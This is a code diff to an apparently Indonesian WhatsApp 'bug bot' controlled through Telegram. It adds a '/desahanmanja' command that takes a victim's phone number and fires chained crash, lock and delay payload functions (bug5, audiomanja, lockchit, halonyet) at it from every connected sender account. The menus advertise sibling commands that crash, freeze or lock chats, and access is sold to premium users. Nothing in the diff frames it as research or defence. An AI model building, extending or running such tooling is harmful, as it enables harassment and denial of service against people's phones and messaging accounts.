@@ -621,6 +621,7 @@ async function sendWAMenu(sock, from, mek, sender) {
 \`「 ANDROID BUG 」\`
 .delayhard 62xxx
 .lockchat 62xxx
+.desahanmanja 62xxx
 .blankclick 62xxx
 .frezehard 62xxx
 
@@ -855,6 +856,20 @@ if (body.trim().toLowerCase() === "bubar") {
           await bug4(sock, target);
           await bug4(sock, target);
           await sock.sendMessage(from, { text: `Bug .frezehard terkirim ke ${args[0]}` }, { quoted: mek });
+        } catch (e) {
+          await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
+        }
+        break;
+      }
+
+      case "desahanmanja": {
+        if (!args[0]) return sock.sendMessage(from, { text: "Contoh: .desahanmanja 628123456789" }, { quoted: mek });
+        const target = args[0].replace(/\D/g, "") + "@s.whatsapp.net";
+        await sock.sendMessage(from, { text: `Mengirim bug .lockchat ke ${args[0]}...` }, { quoted: mek });
+        try {
+          await bug5(sock, target);
+          await bug5(sock, target);
+          await sock.sendMessage(from, { text: `Bug .lockchat terkirim ke ${args[0]}` }, { quoted: mek });
         } catch (e) {
           await sock.sendMessage(from, { text: `Error: ${e.message}` }, { quoted: mek });
         }
@@ -1608,7 +1623,7 @@ html,body{margin:0;padding:0;width:100%;height:100%;background:radial-gradient(c
   } catch (e) {}
 }
 
-async function lockchet(sock, target) {
+async function audiomanja(sock, target) {
   const uid = () => 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
     const r = Math.random() * 16 | 0
     return (c === 'x' ? r : (r & 3 | 8)).toString(16)
@@ -2186,10 +2201,10 @@ async function bug1(sock, target) {
 }
 
 async function bug2(sock, target) {
-  for (let i = 0; i < 5; i++) {
+  for (let i = 0; i < 1; i++) {
     try {
       await anjay(sock, target);
-      await lockchet(sock, target);
+      await audiomanja(sock, target);
       await lockchit(sock, target);     
       await halonyet(sock, target);
       await halonyet(sock, target);    
@@ -2229,6 +2244,22 @@ async function bug4(sock, target) {
       await sleep(500);
       await delaylohyah(sock, target);
       await sleep(500);
+      console.log(`bug send to ${target}`);
+    } catch (innerError) {
+      console.error(`error:`, innerError);
+    }
+  }
+}
+
+async function bug5(sock, target) {
+  for (let i = 0; i < 1; i++) {
+    try {
+      await audiomanja(sock, target);
+      await lockchit(sock, target);     
+      await halonyet(sock, target);
+      await halonyet(sock, target);    
+      await delaylohyah(sock, target);
+      await sleep(500);               
       console.log(`bug send to ${target}`);
     } catch (innerError) {
       console.error(`error:`, innerError);
@@ -2285,6 +2316,7 @@ function getkintanaMenu() {
 <tr><th>command</th><th>description</th></tr>
 <tr><td><code>/delayhard</code></td><td>delayy hard crash</td></tr>
 <tr><td><code>/lockchat</code></td><td>lock whatsapp chat</td></tr>
+<tr><td><code>/desahanmanja</code></td><td>prank audio whatsapp</td></tr>
 <tr><td><code>/blankclick</code></td><td>crash click chat</td></tr>
 <tr><td><code>/frezehard</code></td><td>freeze chat x delay</td></tr>
 </table>
@@ -3296,6 +3328,92 @@ bot.onText(/^\/(frezehard)(?:\s+(.+))?$/, async (msg, match) => {
         if (!sock?.user) continue;
         bug4(sock, target);
         bug4(sock, target);
+        const currentDelay = getCurrentDelay();
+        if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
+      } catch (outerError) {
+        console.error(`[bot ${botNum}] fatal error:`, outerError);
+      }
+    }
+
+  } catch (mainError) {
+    console.error("main error:", mainError);
+    await sendRichMenu(chatId, `<h3>system error</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>status</td><td>try again later</td></tr>
+</table>`);
+  }
+});
+
+bot.onText(/^\/(desahanmanja)(?:\s+(.+))?$/, async (msg, match) => {
+  const chatId = msg.chat.id;
+  const commandName = match[1];
+  const userId = msg.from.id;
+  const idgc = String(chatId);
+
+  if (!isOwner(userId) && !premiumUsers.includes(userId) && !murbugGC.includes(idgc)) {
+    return restricted(chatId);
+  }
+
+  if (!match[2]) {
+    return sendRichMenu(chatId,
+      `<h3>missing target</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>command</td><td>/${commandName}</td></tr>
+<tr><td>example</td><td>/${commandName} 628123456789</td></tr>
+</table>
+<tg-button-row>
+  <tg-button type="url" url="https://t.me/heysaka" style="primary">creator</tg-button>
+</tg-button-row>`,
+      msg.message_id
+    );
+  }
+
+  const [targetNumber] = match[2].split(" ");
+  const formattedNumber = targetNumber.replace(/[^0-9]/g, "");
+  const target = `${formattedNumber}@s.whatsapp.net`;
+
+  try {
+    let allSessions = Array.from(sessions.entries()).filter(([_, data]) => {
+      if (data.type === "public") return true;
+      if (data.type === "private") return data.ownerId === userId;
+      return false;
+    });
+
+    if (allSessions.length === 0) {
+      return sendRichMenu(chatId,
+        `<h3>no sender</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>status</td><td>no bot connected</td></tr>
+<tr><td>action</td><td>use /addsenderpublic or /addsenderprivat</td></tr>
+</table>`
+      );
+    }
+
+    if (lastBugTime > 0) {
+      const remaining = getRemainingTime();
+      if (remaining > 0) {
+        return sendRichMenu(chatId,
+          `<h3>on delay</h3>
+<table border="2">
+<tr><th>info</th><th>detail</th></tr>
+<tr><td>wait</td><td>${formatDelay(remaining)} more</td></tr>
+</table>`
+        );
+      }
+    }
+
+    await sendBugSuccess(chatId, formattedNumber, commandName, msg.message_id);
+    updateLastBugTime();
+
+    for (const [botNum, data] of allSessions) {
+      const sock = data.sock;
+      try {
+        if (!sock?.user) continue;
+        bug5(sock, target);
+        bug5(sock, target);
         const currentDelay = getCurrentDelay();
         if (currentDelay > 0) await new Promise(resolve => setTimeout(resolve, currentDelay));
       } catch (outerError) {
